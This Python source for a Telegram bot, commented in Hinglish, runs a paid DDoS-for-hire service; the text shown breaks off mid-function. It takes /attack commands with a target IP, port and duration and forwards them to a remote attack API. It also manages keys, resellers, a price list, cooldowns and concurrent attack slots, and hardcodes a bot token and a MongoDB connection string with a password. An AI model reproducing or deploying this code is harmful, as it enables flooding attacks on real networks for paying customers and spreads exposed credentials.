import telebot
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton
import threading
import os
import random
import string
import re
import sys
from pymongo import MongoClient
from datetime import datetime, timedelta
import time
import requests

# ✅ Safe psutil import
try:
    import psutil
except ImportError:
    psutil = None

from collections import defaultdict

# ✅ Safe dotenv import
try:
    from dotenv import load_dotenv
    load_dotenv()
except ImportError:
    print("⚠️ python-dotenv not installed. Using defaults.", flush=True)

sys.stdout.reconfigure(line_buffering=True)
sys.stderr.reconfigure(line_buffering=True)

BOT_START_TIME = datetime.now()

# ===== CONFIGURATION =====
BOT_TOKEN = os.getenv("BOT_TOKEN", "8996918007:AAF71vW0_YxDEwRQMpKsFChHltgg3Nlw0us")
BOT_OWNER = int(os.getenv("BOT_OWNER", "6539807903"))
MONGO_URL = os.getenv(
    "MONGO_URL",
    "mongodb+srv://bobby84888_db_user:laS6C0qE0AWKrbUP@bobbymaster.cnk9aei.mongodb.net/?appName=BOBBYMASTER"
)

# ===== NEW API CONFIG (2 SLOTS) =====
API_KEY = os.getenv("API_KEY", "@mahakal1814")
API_BASE_URL = os.getenv("API_BASE_URL", "http://mahakaldak.duckdns.org:5000/")
API_SLOTS = int(os.getenv("API_SLOTS", "2"))

PRIVATE_CHANNEL_LINK = os.getenv("PRIVATE_CHANNEL_LINK", "https://t.me/+l-KkkktXzy1jMDll")
DEFAULT_PRIVATE_MAX_ATTACK_TIME = int(os.getenv("DEFAULT_PRIVATE_MAX_ATTACK_TIME", "300"))
DEFAULT_GROUP_MAX_ATTACK_TIME = int(os.getenv("DEFAULT_GROUP_MAX_ATTACK_TIME", "60"))
DEFAULT_PRIVATE_COOLDOWN = int(os.getenv("DEFAULT_PRIVATE_COOLDOWN", "30"))
DEFAULT_GROUP_COOLDOWN = int(os.getenv("DEFAULT_GROUP_COOLDOWN", "120"))
DEFAULT_CONCURRENT_LIMIT = API_SLOTS

# ✅ DEFAULT BLOCKED IP PREFIXES (20. and 52.)
DEFAULT_BLOCKED_IPS = ['20.', '52.']


def _mask(s, keep=6):
    if not s:
        return "<empty>"
    s = str(s)
    return s[:keep] + "..." + s[-4:] if len(s) > keep + 4 else "***"


print("=" * 60, flush=True)
print("🔧 RESOLVED CONFIG", flush=True)
print(f"  BOT_TOKEN        = {_mask(BOT_TOKEN, 10)}", flush=True)
print(f"  BOT_OWNER        = {BOT_OWNER}", flush=True)
print(f"  MONGO_URL        = {_mask(MONGO_URL, 30)}", flush=True)
print(f"  API_KEY          = {_mask(API_KEY, 6)}", flush=True)
print(f"  API_BASE_URL     = {API_BASE_URL}", flush=True)
print(f"  API_SLOTS        = {API_SLOTS}", flush=True)
print("=" * 60, flush=True)

# ===== MongoDB Connect with Retry =====
print("Connecting to MongoDB...", flush=True)


def _connect_mongo(url, attempts=5, delay=5):
    last_err = None
    for i in range(attempts):
        try:
            c = MongoClient(url, serverSelectionTimeoutMS=5000)
            c.admin.command("ping")
            return c
        except Exception as e:
            last_err = e
            print(f"MongoDB attempt {i + 1}/{attempts} failed: {e}", flush=True)
            time.sleep(delay)
    raise SystemExit(f"MongoDB unreachable after {attempts} attempts: {last_err}")


try:
    client = _connect_mongo(MONGO_URL)
    db = client['telegram_bot']
    keys_collection = db['keys']
    users_collection = db['users']
    resellers_collection = db['resellers']
    attack_logs_collection = db['attack_logs']
    bot_users_collection = db['bot_users']
    bot_settings_collection = db['bot_settings']
    groups_collection = db['groups']

    keys_collection.create_index('key', unique=True)
    users_collection.create_index('user_id', unique=True)
    resellers_collection.create_index('user_id', unique=True)
    bot_users_collection.create_index('user_id', unique=True)

    print("MongoDB connected successfully!", flush=True)
except Exception as e:
    print(f"MongoDB connection error: {e}", flush=True)
    exit(1)

bot = telebot.TeleBot(BOT_TOKEN)

PRIVATE_CHANNEL_NAME = "PRIVATE CHANNEL"


def get_private_channel_id():
    return get_setting('private_channel_id', None)


def set_private_channel_id(cid):
    set_setting('private_channel_id', cid)


# ===== NEW API TEMPLATE (2 SLOTS) =====
API_TEMPLATE = f"{API_BASE_URL}?key={API_KEY}&ip={{ip}}&port={{port}}&time={{duration}}"
API_LIST = [API_TEMPLATE for _ in range(API_SLOTS)]

RESELLER_PRICING = {
    '12h': {'price': 25, 'seconds': 12 * 3600, 'label': '12 Hours'},
    '1d': {'price': 50, 'seconds': 24 * 3600, 'label': '1 Day'},
    '3d': {'price': 130, 'seconds': 3 * 24 * 3600, 'label': '3 Days'},
    '7d': {'price': 250, 'seconds': 7 * 24 * 3600, 'label': '1 Week'},
    '30d': {'price': 750, 'seconds': 30 * 24 * 3600, 'label': '1 Month'},
    '60d': {'price': 1250, 'seconds': 60 * 24 * 3600, 'label': '1 Season (60 Days)'}
}


def get_setting(key, default):
    try:
        setting = bot_settings_collection.find_one({'key': key})
        if setting:
            return setting['value']
        return default
    except:
        return default


def set_setting(key, value):
    bot_settings_collection.update_one(
        {'key': key},
        {'$set': {'key': key, 'value': value}},
        upsert=True
    )


def update_reseller_pricing():
    for dur in RESELLER_PRICING:
        saved_price = get_setting(f'price_{dur}', None)
        if saved_price is not None:
            RESELLER_PRICING[dur]['price'] = saved_price


update_reseller_pricing()


def get_private_max_attack_time():
    try:
        return int(get_setting('private_max_attack_time', DEFAULT_PRIVATE_MAX_ATTACK_TIME))
    except:
        return DEFAULT_PRIVATE_MAX_ATTACK_TIME


def get_group_max_attack_time():
    try:
        return int(get_setting('group_max_attack_time', DEFAULT_GROUP_MAX_ATTACK_TIME))
    except:
        return DEFAULT_GROUP_MAX_ATTACK_TIME


def get_private_cooldown():
    try:
        return int(get_setting('private_cooldown', DEFAULT_PRIVATE_COOLDOWN))
    except:
        return DEFAULT_PRIVATE_COOLDOWN


def get_group_cooldown():
    try:
        return int(get_setting('group_cooldown', DEFAULT_GROUP_COOLDOWN))
    except:
        return DEFAULT_GROUP_COOLDOWN


def get_concurrent_limit():
    try:
        return int(get_setting('_cx_th', DEFAULT_CONCURRENT_LIMIT))
    except:
        return DEFAULT_CONCURRENT_LIMIT


def is_maintenance():
    return get_setting('maintenance_mode', False)


def get_maintenance_msg():
    return get_setting('maintenance_msg', '🔧 Bot maintenance mein hai. Baad mein try karo.')


def set_maintenance(enabled, msg=None):
    set_setting('maintenance_mode', enabled)
    if msg:
        set_setting('maintenance_msg', msg)


# ============================================================
# ✅ BLOCKED IPs — 20. and 52. ALWAYS BLOCKED (force-merge)
# ============================================================
def get_blocked_ips():
    """Blocked IP prefixes return karo. 20. aur 52. hamesha included rahenge."""
    blocked = get_setting('blocked_ips', [])
    if not isinstance(blocked, list):
        blocked = []
    # ✅ Force ensure 20. and 52. always blocked
    for prefix in DEFAULT_BLOCKED_IPS:
        if prefix not in blocked:
            blocked.append(prefix)
    # Save back if changed
    set_setting('blocked_ips', blocked)
    return blocked


def add_blocked_ip(ip_prefix):
    blocked = get_blocked_ips()
    if ip_prefix not in blocked:
        blocked.append(ip_prefix)
        set_setting('blocked_ips', blocked)
        return True
    return False


def remove_blocked_ip(ip_prefix):
    """20. aur 52. ko remove nahi kar sakte."""
    if ip_prefix in DEFAULT_BLOCKED_IPS:
        return False
    blocked = get_blocked_ips()
    if ip_prefix in blocked:
        blocked.remove(ip_prefix)
        set_setting('blocked_ips', blocked)
        return True
    return False


def is_ip_blocked(ip):
    blocked = get_blocked_ips()
    for prefix in blocked:
        if ip.startswith(prefix):
            return True
    return False


def get_ddos_protection():
    return get_setting('ddos_protection', True)


def set_ddos_protection(enabled):
    set_setting('ddos_protection', enabled)


def get_approved_groups():
    return get_setting('approved_groups', [])


def add_approved_group(group_id):
    approved = get_approved_groups()
    if group_id not in approved:
        approved.append(group_id)
        set_setting('approved_groups', approved)
        return True
    return False


def remove_approved_group(group_id):
    approved = get_approved_groups()
    if group_id in approved:
        approved.remove(group_id)
        set_setting('approved_groups', approved)
        return True
    return False


def is_group_approved(group_id):
    approved = get_approved_groups()
    return group_id in approved


def get_feedback_enabled():
    return get_setting('feedback_enabled', True)


def set_feedback_enabled(enabled):
    set_setting('feedback_enabled', enabled)


def get_reel_enabled():
    return get_setting('reel_enabled', True)


def set_reel_enabled(enabled):
    set_setting('reel_enabled', enabled)


def get_reel_list():
    reels = get_setting('reel_list', [])
    return reels if isinstance(reels, list) else []


def add_reel(file_id):
    reels = get_reel_list()
    if file_id not in reels:
        reels.append(file_id)
        set_setting('reel_list', reels)
        return True
    return False


def remove_reel(index):
    reels = get_reel_list()
    if 0 <= index < len(reels):
        removed = reels.pop(index)
        set_setting('reel_list', reels)
        return removed
    return None


def get_random_reel():
    reels = get_reel_list()
    if reels:
        return random.choice(reels)
    return None


class DDOSProtection:
    def __init__(self):
        self.user_requests = defaultdict(list)
        self.chat_requests = defaultdict(list)
        self.blocked_users = set()
        self.global_counter = 0
        self.global_reset = time.time()
        self.enabled = True

    def is_ddos_attack(self, user_id, chat_id):
        if not self.enabled:
            return False
        now = time.time()
        if user_id in self.blocked_users:
            return True
        if now - self.global_reset > 1:
            self.global_counter = 0
            self.global_reset = now
        self.global_counter += 1
        if self.global_counter > 30:
            print(f"🌐 Global rate limit exceeded: {self.global_counter} RPS")
            time.sleep(0.1)
            return True
        self.user_requests[user_id] = [t for t in self.user_requests[user_id] if now - t < 5]
        if len(self.user_requests[user_id]) >= 5:
            self.blocked_users.add(user_id)
            print(f"🚫 Blocked spammer user: {user_id}")
            return True
        self.chat_requests[chat_id] = [t for t in self.chat_requests[chat_id] if now - t < 5]
        if len(self.chat_requests[chat_id]) >= 20:
            print(f"📊 Chat rate limit: {len(self.chat_requests[chat_id])} req/5s")
            time.sleep(0.05)
            return True
        self.user_requests[user_id].append(now)
        self.chat_requests[chat_id].append(now)
        return False


protection = DDOSProtection()


def check_maintenance(message):
    if is_maintenance() and message.from_user.id != BOT_OWNER:
        bot.reply_to(message, get_maintenance_msg())
        return True
    return False


def check_banned(message):
    user_id = message.from_user.id
    if user_id == BOT_OWNER:
        return False
    user = users_collection.find_one({'user_id': user_id})
    if user and user.get('banned'):
        if user.get('ban_type') == 'temporary' and user.get('ban_expiry'):
            if datetime.now() > user['ban_expiry']:
                users_collection.update_one(
                    {'user_id': user_id},
                    {'$set': {'banned': False}, '$unset': {'ban_expiry': "", 'ban_type': ""}}
                )
                return False
            expiry_str = user['ban_expiry'].strftime('%d-%m-%Y %H:%M:%S')
            bot.reply_to(message, f"🚫 TEMPORARY BAN!\n⏳ Expiry: {expiry_str}\n📞 Contact Your Seller")
            return True
        bot.reply_to(message, f"🚫 PERMANENT BAN!\n📞 Contact Your Seller")
        return True
    return False


def check_channel_join(message):
    user_id = message.from_user.id
    if user_id == BOT_OWNER or is_reseller(user_id):
        return True

    channel_id = get_private_channel_id()
    if not channel_id:
        print("⚠️ private_channel_id not set! Owner must run /setchannel <id>")
        return True

    try:
        member = bot.get_chat_member(channel_id, user_id)
        if member.status in ['member', 'administrator', 'creator']:
            return True
    except Exception as e:
        print(f"⚠️ Channel check error: {e}")

    bot.reply_to(message,
                 f"❌ 𝗣𝗟𝗘𝗔𝗦𝗘 𝗝𝗢𝗜𝗡 𝗢𝗨𝗥 𝗣𝗥𝗜𝗩𝗔𝗧𝗘 𝗖𝗛𝗔𝗡𝗡𝗘𝗟!\n\n"
                 f"🔗 {PRIVATE_CHANNEL_LINK}\n\n"
                 f"Join karne ke baad /verify use karo,\n"
                 f"phir /attack <ip> <port> <time> bhej do ✅"
                 )
    return False


def check_group_approval(message):
    chat_id = message.chat.id
    if message.chat.type in ['private', 'personal']:
        return True
    if message.from_user.id == BOT_OWNER:
        return True
    if is_group_approved(chat_id):
        return True
    bot.reply_to(message,
                 f"❌ 𝗚𝗥𝗢𝗨𝗣 𝗡𝗢𝗧 𝗔𝗣𝗣𝗥𝗢𝗩𝗘𝗗!\n\n"
                 f"📢 Group ID: `{chat_id}`\n\n"
                 f"Owner can use: /addgrp {chat_id}",
                 parse_mode="Markdown"
                 )
    return False


import threading as _threading
import time as _time

_attack_lock = _threading.Lock()


def maintenance_auto_extender():
    while True:
        try:
            if is_maintenance():
                now = datetime.now()
                active_users = users_collection.find({'key_expiry': {'$gt': now}})
                for user in active_users:
                    new_expiry = user['key_expiry'] + timedelta(minutes=1)
                    users_collection.update_one({'_id': user['_id']}, {'$set': {'key_expiry': new_expiry}})
            _time.sleep(60)
        except Exception as e:
            print(f"Maintenance extender error: {e}")
            _time.sleep(10)


extender_thread = _threading.Thread(target=maintenance_auto_extender, daemon=True)
extender_thread.start()

active_attacks = {}
user_cooldowns = {}
api_in_use = {}
user_attack_history = {}
bot_start_time = datetime.now()
pending_feedback = {}


def set_pending_feedback(user_id, target, port, duration):
    pending_feedback[user_id] = {"target": target, "port": port, "duration": duration, "timestamp": datetime.now()}


def get_pending_feedback(user_id):
    return pending_feedback.get(user_id)


def clear_pending_feedback(user_id):
    if user_id in pending_feedback:
        del pending_feedback[user_id]


def log_attack(user_id, username, target, port, duration):
    attack_logs_collection.insert_one({
        'user_id': user_id,
        'username': username,
        'target': target,
        'port': port,
        'duration': duration,
        'timestamp': datetime.now()
    })


def is_owner(user_id):
    return user_id == BOT_OWNER


def is_reseller(user_id):
    reseller = resellers_collection.find_one({'user_id': user_id, 'blocked': {'$ne': True}})
    return reseller is not None


def has_valid_key(user_id):
    user = users_collection.find_one({'user_id': user_id, 'key': {'$ne': None}})
    if not user or not user.get('key_expiry'):
        return False
    if datetime.now() > user['key_expiry']:
        users_collection.update_one({'user_id': user_id}, {'$set': {'key': None, 'key_expiry': None}})
        return False
    return True


def get_user_cooldown(user_id, is_group=False):
    with _attack_lock:
        if user_id not in user_cooldowns:
            return 0
        cooldown_end = user_cooldowns[user_id]
        remaining = (cooldown_end - datetime.now()).total_seconds()
        if remaining <= 0:
            del user_cooldowns[user_id]
            return 0
        return int(remaining)


def get_active_attack_count():
    with _attack_lock:
        now = datetime.now()
        expired = [k for k, v in active_attacks.items() if v['end_time'] <= now]
        for k in expired:
            if k in active_attacks:
                del active_attacks[k]
            if k in api_in_use:
                del api_in_use[k]
        return len(active_attacks)


def user_has_active_attack(user_id):
    with _attack_lock:
        now = datetime.now()
        for attack_id, attack in list(active_attacks.items()):
            if attack['end_time'] <= now:
                continue
            if attack.get('user_id') == user_id:
                return True
        return False


def get_user_active_attack(user_id):
    """User ka active attack details return karo, warna None"""
    with _attack_lock:
        now = datetime.now()
        for attack_id, attack in list(active_attacks.items()):
            if attack['end_time'] <= now:
                continue
            if attack.get('user_id') == user_id:
                return attack
    return None


def make_progress_bar(percent, length=20):
    """Progress bar string banao"""
    filled = int(percent / (100 / length))
    if filled > length:
        filled = length
    if filled < 0:
        filled = 0
    return "█" * filled + "▒" * (length - filled)


def get_free_api_index():
    with _attack_lock:
        now = datetime.now()
        expired = [k for k, v in active_attacks.items() if v['end_time'] <= now]
        for k in expired:
            if k in active_attacks:
                del active_attacks[k]
            if k in api_in_use:
                del api_in_use[k]
        busy_indices = set(api_in_use.values())
        for i in range(len(API_LIST)):
            if i not in busy_indices:
                return i
        return None


def validate_target(target):
    ip_pattern = re.compile(r'^(\d{1,3}\.){3}\d{1,3}$')
    if ip_pattern.match(target):
        parts = target.split('.')
        for part in parts:
            if int(part) > 255:
                return False
        return True
    return False


def track_bot_user(user_id, username=None):
    try:
        bot_users_collection.update_one(
            {'user_id': user_id},
            {'$set': {'user_id': user_id, 'username': username, 'last_seen': datetime.now()}},
            upsert=True
        )
    except:
        pass


def _call_single_api(slot_index, url, target, port, duration):
    try:
        response = requests.get(url, timeout=10)
        print(f"[API SLOT {slot_index + 1}] Target: {target}:{port} | Status: {response.status_code} | Response: {response.text}",
              flush=True)
    except Exception as e:
        print(f"[API SLOT {slot_index + 1}] Target: {target}:{port} | Error: {e}", flush=True)


def generate_attack_start_ui(target, port, duration, user_id):
    return f'''🚀 𝗔𝗧𝗧𝗔𝗖𝗞 𝗦𝗧𝗔𝗥𝗧𝗘𝗗! 🚀
━━━━━━━━━━━━━━━━━━━━
🎯 𝗧𝗮𝗿𝗴𝗲𝘁: {target}:{port}
⏱️ 𝗗𝘂𝗿𝗮𝘁𝗶𝗼𝗻: {duration}s
👤 𝗨𝘀𝗲𝗿: {user_id}
━━━━━━━━━━━━━━━━━━━━
📊 Live progress dekhne ke liye /status bhejo
⏳ Attack complete hone tak wait karo'''


def generate_attack_complete_ui(target, port, duration, show_private_link=False):
    msg = f'''✅ 𝗔𝗧𝗧𝗔𝗖𝗞 𝗖𝗢𝗠𝗣𝗟𝗘𝗧𝗘𝗗! ✅
━━━━━━━━━━━━━━━━━━━━
🎯 𝗧𝗮𝗿𝗴𝗲𝘁: {target}:{port}
⏱️ 𝗗𝘂𝗿𝗮𝘁𝗶𝗼𝗻: {duration}s
━━━━━━━━━━━━━━━━━━━━
📸 𝗔𝗯 𝘀𝗰𝗿𝗲𝗲𝗻𝘀𝗵𝗼𝘁 𝗯𝗵𝗲𝗷𝗼 (feedback)
⏳ Agli attack ke liye ready ho jao'''
    if show_private_link:
        msg += f'''

━━━━━━━━━━━━━━━━━━━━
📢 𝗝𝗢𝗜𝗡 𝗢𝗨𝗥 𝗣𝗥𝗜𝗩𝗔𝗧𝗘 𝗖𝗛𝗔𝗡𝗡𝗘𝗟
🔗 {PRIVATE_CHANNEL_LINK}
━━━━━━━━━━━━━━━━━━━━'''
    return msg


def generate_global_status_ui():
    get_active_attack_count()
    attacks = list(active_attacks.items())
    if not attacks:
        return "🚀 No active attacks right now."

    header = "🚀 𝗔𝗖𝗧𝗜𝗩𝗘 𝗔𝗧𝗧𝗔𝗖𝗞𝗦 𝗦𝗧𝗔𝗧𝗨𝗦 🚀\n━━━━━━━━━━━━━━━━━━━━"
    body = ""
    for idx, (attack_id, info) in enumerate(attacks[:10], 1):
        remaining = (info['end_time'] - datetime.now()).total_seconds()
        if remaining < 0:
            continue
        total_dur = info['duration']
        elapsed = total_dur - remaining
        percent = int((elapsed / total_dur) * 100) if total_dur > 0 else 0

        filled = int(percent / 5)
        empty = 20 - filled
        bar = "█" * filled + "▒" * empty

        user_id = info.get('user_id', 'Unknown')
        user_type = "Private" if not info.get('is_group', False) else "Group"

        body += f"""
💢 𝗧𝗮𝗿𝗴𝗲𝘁: {info['target']}:{info['port']}
⏱️ 𝗥𝗲𝗺𝗮𝗶𝗻𝗶𝗻𝗴: {int(remaining)}s | 👤 𝗕𝘆: {user_id} (👤 {user_type})
📊 𝗣𝗿𝗼𝗴𝗿𝗲𝘀𝘀: {bar} {percent}%
"""
    footer = "━━━━━━━━━━━━━━━━━━━━"
    return header + body + footer


def start_attack(target, port, duration, message, attack_id, api_index, is_group=False):
    try:
        user_id = message.from_user.id
        username = message.from_user.username or message.from_user.first_name or str(user_id)
        log_attack(user_id, username, target, port, duration)
        if not is_owner(user_id) and get_feedback_enabled():
            set_pending_feedback(user_id, target, port, duration)
        attack_start_msg = generate_attack_start_ui(target, port, duration, user_id)

        try:
            if get_reel_enabled():
                reel_id = get_random_reel()
                if reel_id:
                    bot.send_video(
                        message.chat.id,
                        reel_id,
                        caption=attack_start_msg,
                        supports_streaming=True
                    )
                else:
                    bot.reply_to(message, attack_start_msg)
            else:
                bot.reply_to(message, attack_start_msg)
        except Exception as e:
            print(f"Reel send error: {e}")
            bot.reply_to(message, attack_start_msg)

        api_url = API_LIST[api_index].format(ip=target, port=port, duration=duration)
        try:
            t = threading.Thread(target=_call_single_api, args=(api_index, api_url, target, port, duration))
            t.daemon = True
            t.start()
        except Exception as e:
            print(f"[API SLOT {api_index + 1}] Launch Error: {e}", flush=True)
        time.sleep(duration)
        with _attack_lock:
            if attack_id in active_attacks:
                del active_attacks[attack_id]
            if attack_id in api_in_use:
                del api_in_use[attack_id]
        show_link = (not is_owner(user_id)) and (not has_valid_key(user_id))
        complete_msg = generate_attack_complete_ui(target, port, duration, show_private_link=show_link)
        bot.reply_to(message, complete_msg)
    except Exception as e:
        with _attack_lock:
            if attack_id in active_attacks:
                del active_attacks[attack_id]
            if attack_id in api_in_use:
                del api_in_use[attack_id]


# ============================================================
# ===== ✅ /status COMMAND (User apna, Owner sab) =====
# ============================================================
@bot.message_handler(commands=["status"])
def status_command(message):
    if check_maintenance(message):
        return
    if check_banned(message):
        return

    user_id = message.from_user.id

    try:
        # Owner ko sab attacks dikhao
        if is_owner(user_id):
            status_text = generate_global_status_ui()
            bot.reply_to(message, status_text)
            return

        # Normal user ko apna attack dikhao
        active = get_user_active_attack(user_id)
        if not active:
            bot.reply_to(
                message,
                f"📊 𝗞𝗼𝗶 𝗔𝗰𝘁𝗶𝘃𝗲 𝗔𝘁𝘁𝗮𝗰𝗸 𝗡𝗮𝗵𝗶 𝗛𝗮𝗶\n"
                f"━━━━━━━━━━━━━━━━━━━━\n"
                f"🚀 Attack start karne ke liye:\n"
                f"/attack <ip> <port> <time>"
            )
            return

        remaining = int((active['end_time'] - datetime.now()).total_seconds())
        total = active['duration']
        elapsed = total - remaining
        percent = int((elapsed / total) * 100) if total > 0 else 0
        bar = make_progress_bar(percent)

        bot.reply_to(
            message,
            f"📊 𝗬𝗢𝗨𝗥 𝗔𝗖𝗧𝗜𝗩𝗘 𝗔𝗧𝗧𝗔𝗖𝗞 📊\n"
            f"━━━━━━━━━━━━━━━━━━━━\n\n"
            f"💢 𝗧𝗮𝗿𝗴𝗲𝘁: {active['target']}:{active['port']}\n"
            f"⏱️ 𝗥𝗲𝗺𝗮𝗶𝗻𝗶𝗻𝗴: {remaining}s / {total}s\n"
            f"📊 𝗣𝗿𝗼𝗴𝗿𝗲𝘀𝘀: {bar} {percent}%\n"
            f"🕐 𝗦𝘁𝗮𝗿𝘁𝗲𝗱: {active['start_time'].strftime('%H:%M:%S')}\n\n"
            f"━━━━━━━━━━━━━━━━━━━━\n"
            f"⏳ Attack complete hone ka wait karo."
        )
    except Exception as e:
        print(f"Status error: {e}", flush=True)
        bot.reply_to(message, f"❌ Status error: {e}")


@bot.message_handler(commands=['reel_on'])
def reel_on_command(message):
    if not is_owner(message.from_user.id):
        bot.reply_to(message, "❌ Ye command sirf owner use kar sakta hai!")
        return
    set_reel_enabled(True)
    bot.reply_to(message, "✅ Reel feature ENABLED!")


@bot.message_handler(commands=['reel_off'])
def reel_off_command(message):
    if not is_owner(message.from_user.id):
        bot.reply_to(message, "❌ Ye command sirf owner use kar sakta hai!")
        return
    set_reel_enabled(False)
    bot.reply_to(message, "✅ Reel feature DISABLED!")


@bot.message_handler(commands=['addreel'])
def add_reel_command(message):
    if not is_owner(message.from_user.id):
        bot.reply_to(message, "❌ Ye command sirf owner use kar sakta hai!")
        return
    if not message.reply_to_message:
        bot.reply_to(message, "⚠️ Kisi video message ko reply karke /addreel likho.")
        return
    if message.reply_to_message.video:
        file_id = message.reply_to_message.video.file_id
    elif message.reply_to_message.animation:
        file_id = message.reply_to_message.animation.file_id
    else:
        bot.reply_to(message, "❌ Sirf video ya GIF add kar sakte ho.")
        return
    if add_reel(file_id):
        count = len(get_reel_list())
        bot.reply_to(message, f"✅ Reel added! Total reels: {count}")
    else:
        bot.reply_to(message, "⚠️ Ye reel pehle se add hai.")


@bot.message_handler(commands=['removereel'])
def remove_reel_command(message):
    if not is_owner(message.from_user.id):
        bot.reply_to(message, "❌ Ye command sirf owner use kar sakta hai!")
        return
    parts = message.text.split()
    if len(parts) != 2:
        bot.reply_to(message, "⚠️ Usage: /removereel <index>")
        return
    try:
        index = int(parts[1]) - 1
    except:
        bot.reply_to(message, "❌ Invalid index!")
        return
    removed = remove_reel(index)
    if removed:
        bot.reply_to(message, f"✅ Reel #{index + 1} remove kar di gayi.")
    else:
        bot.reply_to(message, "❌ Invalid index!")


@bot.message_handler(commands=['listreels'])
def list_reels_command(message):
    if not is_owner(message.from_user.id):
        bot.reply_to(message, "❌ Ye command sirf owner use kar sakta hai!")
        return
    reels = get_reel_list()
    if not reels:
        bot.reply_to(message, "📋 Koi reel nahi hai.")
        return
    response = "📋 𝗥𝗘𝗘𝗟 𝗟𝗜𝗦𝗧\n\n"
    for i, fid in enumerate(reels, 1):
        response += f"{i}. `{fid[:10]}...`\n"
    response += f"\nTotal: {len(reels)} reels"
    bot.reply_to(message, response, parse_mode="Markdown")


@bot.message_handler(commands=["verify"])
def verify_command(message):
    if check_maintenance(message): return
    if check_banned(message): return
    user_id = message.from_user.id
    if user_id == BOT_OWNER or is_reseller(user_id):
        bot.reply_to(message, "✅ Owner/Reseller — no check needed.")
        return
    channel_id = get_private_channel_id()
    if not channel_id:
        bot.reply_to(message, "⚠️ Owner ne channel set nahi kiya.")
        return
    try:
        member = bot.get_chat_member(channel_id, user_id)
        if member.status in ['member', 'administrator', 'creator']:
            bot.reply_to(message, f"✅ 𝗩𝗘𝗥𝗜𝗙𝗜𝗘𝗗!\nAb /attack use karo.")
        else:
            bot.reply_to(message, f"❌ Channel join nahi kiya!\n🔗 {PRIVATE_CHANNEL_LINK}")
    except Exception as e:
        print(f"Verify error: {e}")
        bot.reply_to(message, f"❌ Verification failed. Join: {PRIVATE_CHANNEL_LINK}")


@bot.message_handler(commands=["id"])
def id_command(message):
    if check_banned(message): return
    bot.reply_to(message, f"`{message.from_user.id}`", parse_mode="Markdown")


@bot.message_handler(commands=["ping"])
def ping_command(message):
    start_time = datetime.now()
    total_users = users_collection.count_documents({})
    uptime_seconds = (datetime.now() - bot_start_time).total_seconds()
    hours = int(uptime_seconds // 3600)
    minutes = int((uptime_seconds % 3600) // 60)
    seconds = int(uptime_seconds % 60)
    uptime_str = f"{hours}h {minutes:02d}m {seconds:02d}s"
    response_time = int((datetime.now() - start_time).total_seconds() * 1000)
    ddos_status = "✅ ON" if get_ddos_protection() else "❌ OFF"
    channel_status = "✅ SET" if get_private_channel_id() else "⚠️ NOT SET"
    response = (f"🏓 Pong!\n\n• Response: {response_time}ms\n• Users: {total_users}\n"
                f"• Channel: {channel_status}\n• DDoS: {ddos_status}\n• Uptime: {uptime_str}\n"
                f"• Max Slots: {len(API_LIST)}")
    bot.reply_to(message, response)


@bot.message_handler(commands=["setchannel"])
def set_channel_command(message):
    if not is_owner(message.from_user.id):
        bot.reply_to(message, "❌ Owner only!")
        return
    parts = message.text.split()
    if len(parts) != 2:
        bot.reply_to(message, "⚠️ Usage: /setchannel <channel_id>")
        return
    try:
        cid = int(parts[1])
    except ValueError:
        bot.reply_to(message, "❌ Invalid channel ID!")
        return
    try:
        chat = bot.get_chat(cid)
        bot_member = bot.get_chat_member(cid, bot.get_me().id)
        if bot_member.status not in ['administrator', 'creator']:
            bot.reply_to(message, "⚠️ Bot admin nahi hai us channel me!")
            return
        set_private_channel_id(cid)
        bot.reply_to(message, f"✅ Private channel set!\n🆔 ID: {cid}")
    except Exception as e:
        bot.reply_to(message, f"❌ Error: {e}")


@bot.message_handler(commands=["addgrp"])
def add_group_command(message):
    if not is_owner(message.from_user.id):
        bot.reply_to(message, "❌ Owner only!")
        return
    parts = message.text.split()
    if len(parts) != 2:
        bot.reply_to(message, "⚠️ Usage: /addgrp <group_id>")
        return
    try:
        group_id = int(parts[1])
    except ValueError:
        bot.reply_to(message, "❌ Invalid group ID!")
        return
    if add_approved_group(group_id):
        bot.reply_to(message, f"✅ Group Approved! ID: `{group_id}`", parse_mode="Markdown")
    else:
        bot.reply_to(message, f"ℹ️ Already approved!")


@bot.message_handler(commands=["removegrp"])
def remove_group_command(message):
    if not is_owner(message.from_user.id):
        bot.reply_to(message, "❌ Owner only!")
        return
    parts = message.text.split()
    if len(parts) != 2:
        bot.reply_to(message, "⚠️ Usage: /removegrp <group_id>")
        return
    try:
        group_id = int(parts[1])
    except ValueError:
        bot.reply_to(message, "❌ Invalid group ID!")
        return
    if remove_approved_group(group_id):
        bot.reply_to(message, f"✅ Group Removed! ID: `{group_id}`", parse_mode="Markdown")
    else:
        bot.reply_to(message, f"❌ Not found!")


@bot.message_handler(commands=["ddos_on"])
def ddos_on_command(message):
    if not is_owner(message.from_user.id):
        bot.reply_to(message, "❌ Owner only!")
        return
    set_ddos_protection(True)
    protection.enabled = True
    bot.reply_to(message, "✅ DDoS Protection: ENABLED")


@bot.message_handler(commands=["ddos_off"])
def ddos_off_command(message):
    if not is_owner(message.from_user.id):
        bot.reply_to(message, "❌ Owner only!")
        return
    set_ddos_protection(False)
    protection.enabled = False
    bot.reply_to(message, "❌ DDoS Protection: DISABLED")


@bot.message_handler(commands=["private_max"])
def private_max_command(message):
    if not is_owner(message.from_user.id):
        bot.reply_to(message, "❌ Owner only!")
        return
    parts = message.text.split()
    if len(parts) == 1:
        bot.reply_to(message, f"⚙️ Private Max: {get_private_max_attack_time()}s\nChange: /private_max <seconds>")
        return
    try:
        v = int(parts[1])
        if v < 10 or v > 600:
            bot.reply_to(message, "❌ Value 10-600!")
            return
        set_setting('private_max_attack_time', v)
        bot.reply_to(message, f"✅ Private Max set: {v}s")
    except ValueError:
        bot.reply_to(message, "❌ Invalid number!")


@bot.message_handler(commands=["group_max"])
def group_max_command(message):
    if not is_owner(message.from_user.id):
        bot.reply_to(message, "❌ Owner only!")
        return
    parts = message.text.split()
    if len(parts) == 1:
        bot.reply_to(message, f"⚙️ Group Max: {get_group_max_attack_time()}s\nChange: /group_max <seconds>")
        return
    try:
        v = int(parts[1])
        if v < 10 or v > 300:
            bot.reply_to(message, "❌ Value 10-300!")
            return
        set_setting('group_max_attack_time', v)
        bot.reply_to(message, f"✅ Group Max set: {v}s")
    except ValueError:
        bot.reply_to(message, "❌ Invalid number!")


@bot.message_handler(commands=["private_cooldown"])
def private_cooldown_command(message):
    if not is_owner(message.from_user.id):
        bot.reply_to(message, "❌ Owner only!")
        return
    parts = message.text.split()
    if len(parts) == 1:
        bot.reply_to(message, f"⏳ Private Cooldown: {get_private_cooldown()}s")
        return
    try:
        v = int(parts[1])
        if v < 0 or v > 3600:
